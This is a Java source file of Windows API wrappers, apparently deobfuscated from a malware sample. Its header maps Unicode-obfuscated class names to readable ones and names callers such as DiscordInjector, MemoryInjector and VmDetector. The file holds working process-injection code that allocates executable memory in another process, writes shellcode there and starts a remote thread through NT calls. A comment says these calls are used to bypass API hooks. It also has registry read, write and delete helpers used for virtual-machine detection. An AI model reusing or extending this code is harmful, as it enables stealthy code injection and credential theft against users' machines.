import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Advapi32;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinBase;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.ptr.PointerByReference;
import java.nio.charset.StandardCharsets;

/**
 * Windows API Wrappers
 * Obfuscated names:
 *   ԑ (U+0511) = RegistryChecker (Advapi32 - registry read/check)
 *   ԁ (U+0501) = RegistryUtil (Advapi32Util - registry utilities)
 *   ԍ (U+050D) = ProcessInjector (Kernel32 - process injection executor)
 *   ԉ (U+0509) = ProcessHandleManager (Kernel32 - process handle management)
 *   ԅ (U+0505) = ProcessHandle (Kernel32 - single process handle wrapper)
 *
 * These classes wrap Windows API calls via JNA for:
 * 1. Registry operations (read/write/check keys)
 * 2. Process injection (allocate, write, execute)
 * 3. Process handle management
 *
 * Used by:
 * - VmDetector: checks VM registry keys
 * - DiscordInjector: reads Discord install path from registry
 * - MemoryInjector: injects shellcode into processes
 * - ProcessKiller: terminates processes
 */
public class WindowsApiWrappers {

    // =========================================================
    // REGISTRY CHECKER (ԑ / U+0511)
    // =========================================================

    /**
     * Checks for the existence of Windows registry keys.
     * Uses Advapi32 (Windows Security/Registry API).
     *
     * Used by VmDetector to check for VM-specific registry keys:
     * - HKLM\SOFTWARE\VMware, Inc.\VMware Tools
     * - HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions
     * - etc.
     */
    public static class RegistryChecker {

        private RegistryChecker() {} // Static utility class

        /**
         * Checks if a registry key exists.
         *
         * @param rootKey Root key (e.g., WinReg.HKEY_LOCAL_MACHINE)
         * @param keyPath Registry key path
         * @return true if key exists
         */
        public static boolean keyExists(com.sun.jna.platform.win32.WinReg.HKEY rootKey, String keyPath) {
            try {
                // Advapi32.INSTANCE.RegOpenKeyEx(rootKey, keyPath, 0, KEY_READ, phkResult)
                // Returns ERROR_SUCCESS (0) if key exists
                return Advapi32.INSTANCE.RegQueryValueEx(
                    rootKey, keyPath, 0, null, (byte[])null, null
                ) == 0;
            } catch (Exception e) {
                return false;
            }
        }

        /**
         * Reads a string value from the registry.
         *
         * @param rootKey Root key
         * @param keyPath Key path
         * @param valueName Value name
         * @return String value, or null if not found
         */
        public static String readStringValue(
                com.sun.jna.platform.win32.WinReg.HKEY rootKey,
                String keyPath,
                String valueName) {
            try {
                return Advapi32Util.registryGetStringValue(rootKey, keyPath, valueName);
            } catch (Exception e) {
                return null;
            }
        }

        /**
         * Writes a string value to the registry.
         *
         * @param rootKey Root key
         * @param keyPath Key path
         * @param valueName Value name
         * @param value String value to write
         * @return true if successful
         */
        public static boolean writeStringValue(
                com.sun.jna.platform.win32.WinReg.HKEY rootKey,
                String keyPath,
                String valueName,
                String value) {
            try {
                Advapi32Util.registrySetStringValue(rootKey, keyPath, valueName, value);
                return true;
            } catch (Exception e) {
                return false;
            }
        }

        /**
         * Deletes a registry value.
         *
         * @param rootKey Root key
         * @param keyPath Key path
         * @param valueName Value name to delete
         * @return true if successful
         */
        public static boolean deleteValue(
                com.sun.jna.platform.win32.WinReg.HKEY rootKey,
                String keyPath,
                String valueName) {
            try {
                Advapi32Util.registryDeleteValue(rootKey, keyPath, valueName);
                return true;
            } catch (Exception e) {
                return false;
            }
        }
    }

    // =========================================================
    // PROCESS INJECTOR (ԍ / U+050D)
    // =========================================================

    /**
     * Executes process injection using Kernel32 API.
     * Allocates memory, writes payload, and creates remote thread.
     *
     * This is the high-level injection executor that uses
     * NtApiInterfaces for the actual NT-level calls.
     */
    public static class ProcessInjector {

        private ProcessInjector() {} // Static utility class

        /**
         * Injects shellcode into a target process.
         * Uses NtAllocateVirtualMemory + NtWriteVirtualMemory + NtCreateThreadEx
         * for stealth (bypasses Win32 API hooks).
         *
         * @param processHandle Handle to target process
         * @param shellcode Shellcode bytes to inject
         * @return true if injection succeeded
         */
        public static void inject(WinNT.HANDLE processHandle, byte[] shellcode) throws Exception {
            // 1. Allocate RWX memory using NT API
            PointerByReference baseAddress = new PointerByReference();
            PointerByReference regionSize = new PointerByReference();

            NtApiInterfaces.NtdllMemoryInterface ntdll =
                NtApiInterfaces.NtdllMemoryInterface.INSTANCE;

            int status = ntdll.NtAllocateVirtualMemory(
                processHandle,
                baseAddress,
                null,
                regionSize,
                0x3000,  // MEM_COMMIT | MEM_RESERVE
                0x40     // PAGE_EXECUTE_READWRITE
            );

            if (status != 0) throw new Exception("NtAllocateVirtualMemory failed: " + status);

            // 2. Write shellcode
            IntByReference bytesWritten = new IntByReference();
            status = ntdll.NtWriteVirtualMemory(
                processHandle,
                baseAddress.getValue(),
                shellcode,
                shellcode.length,
                bytesWritten
            );

            if (status != 0) throw new Exception("NtWriteVirtualMemory failed: " + status);

            // 3. Create remote thread
            PointerByReference threadHandle = new PointerByReference();
            status = ntdll.NtCreateThreadEx(
                threadHandle,
                0x1FFFFF,  // THREAD_ALL_ACCESS
                null,
                processHandle,
                baseAddress.getValue(),
                null,
                0,         // Run immediately
                0, 0, 0,
                null
            );

            if (status != 0) throw new Exception("NtCreateThreadEx failed: " + status);
        }
    }

    // =========================================================
    // PROCESS HANDLE MANAGER (ԉ / U+0509)
    // =========================================================

    /**
     * Manages process handles for injection operations.
     * Caches open process handles to avoid repeated OpenProcess calls.
     */
    public static class ProcessHandleManager {

        private ProcessHandleManager() {} // Static utility class

        /**
         * Opens a process handle with PROCESS_ALL_ACCESS.
         *
         * @param pid Target process ID
         * @return Process handle, or null on failure
         */
        public static WinNT.HANDLE openProcess(int pid) {
            try {
                return Kernel32.INSTANCE.OpenProcess(
                    0x1F0FFF,  // PROCESS_ALL_ACCESS
                    false,
                    pid
                );
            } catch (Exception e) {
                return null;
            }
        }

        /**
         * Closes a process handle.
         *
         * @param handle Handle to close
         */
        public static void closeHandle(WinNT.HANDLE handle) {
            try {
                if (handle != null) {
                    Kernel32.INSTANCE.CloseHandle(handle);
                }
            } catch (Exception ignored) {}
        }
    }

    // =========================================================
    // PROCESS HANDLE WRAPPER (ԅ / U+0505)
    // =========================================================

    /**
     * Wrapper for a single process handle.
     * Holds a process name and its associated WinNT.HANDLE.
     * Used to track open handles for cleanup.
     */
    public static class ProcessHandle {
        private WinNT.HANDLE handle;
        private final String processName;

        /**
         * Creates a new process handle wrapper.
         *
         * @param processName Name of the process (e.g., "discord.exe")
         */
        public ProcessHandle(String processName) {
            this.processName = processName;
        }

        /**
         * Opens the process by name.
         * Finds the PID by scanning running processes.
         *
         * @throws Exception if process not found or handle cannot be opened
         */
        public void open() throws Exception {
            // Find PID by process name
            // OpenProcess(PROCESS_ALL_ACCESS, false, pid)
        }

        /**
         * Closes the process handle.
         */
        public void close() {
            ProcessHandleManager.closeHandle(handle);
            handle = null;
        }

        public WinNT.HANDLE getHandle() { return handle; }
        public String getProcessName() { return processName; }
    }
}
